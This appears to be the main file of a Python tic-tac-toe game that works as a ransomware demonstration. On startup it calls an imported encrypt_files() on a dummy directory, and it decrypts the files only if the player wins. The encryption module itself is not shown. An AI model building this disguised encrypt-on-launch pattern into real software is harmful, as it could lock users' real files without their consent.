import ransomware
from ui import *
from ransomware import *
from bot_logic import *

# Initialize the game
pygame.init()
pygame.display.set_caption("Tic Tac Toe")


def main():
    if not is_encrypted():
        encrypt_files(DUMMY_FILES_DIR)
        set_encryption_status("encrypted")

    running = True
    player = "X"
    winner = None
    game_over = False

    pygame.mixer.music.load("assets/background_music.mp3")
    pygame.mixer.music.play(-1)

    while running:
        SCREEN.fill(BACKGROUND_COLOR)
        draw_title()
        draw_grid()
        draw_symbols()

        if winner or is_draw():
            game_over = True

            if winner == "X":
                draw_flickering_text(f"Winner is {winner}", MESSAGE_FONT, TEXT_COLOR, -50, 750)
                decrypt_files(DUMMY_FILES_DIR)
                set_encryption_status("decrypted")
            elif winner == "O":
                draw_flickering_text(f"Winner is {winner}", MESSAGE_FONT, RED, -50, 750)
            else:
                draw_flickering_text("DRAW", MESSAGE_FONT, WHITE, -50, 750)

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.MOUSEBUTTONDOWN and not game_over:
                x, y = event.pos
                col = (x - HORIZONTAL_OFFSET) // CELL_SIZE
                row = y // CELL_SIZE

                if GRID[row][col] is None:
                    GRID[row][col] = player
                    winner = check_winner()

                    if not winner and not is_draw():
                        bot_move = easy_bot(GRID, "O", "X")
                        if bot_move:
                            GRID[bot_move[0]][bot_move[1]] = "O"
                            winner = check_winner()

        pygame.display.flip()

    pygame.quit()


if __name__ == "__main__":
    main()